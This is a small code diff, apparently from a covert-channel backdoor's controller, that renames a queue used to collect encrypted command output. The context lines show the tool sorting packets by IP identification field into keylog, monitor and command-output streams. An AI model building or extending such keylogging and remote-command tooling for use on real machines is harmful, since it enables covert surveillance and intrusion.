@@ -91,7 +91,7 @@ def subprocess_packet_handler(pkt):
     if pkt[IP].id == MONITOR_IDENTIFICATION:
         write_monitor_data(encrypted_message)
     if pkt[IP].id == COMMAND_OUTPUT_IDENTIFICATION:
-        QUEUE.put(encrypted_message)
+        COMMAND_OUTPUT_QUEUE.put(encrypted_message)
 
 
 def write_keylog_data(data):
@@ -158,7 +158,7 @@ def receive_command_output():
             sleep(1)
             continue
         else:
-            encrypted = QUEUE.get()
+            encrypted = COMMAND_OUTPUT_QUEUE.get()
             decrypted = BLOCK_ENCRYPTION_HANDLER.decrypt(encrypted)
             attempts = 0
             if "NUM_BYTES:" in decrypted:
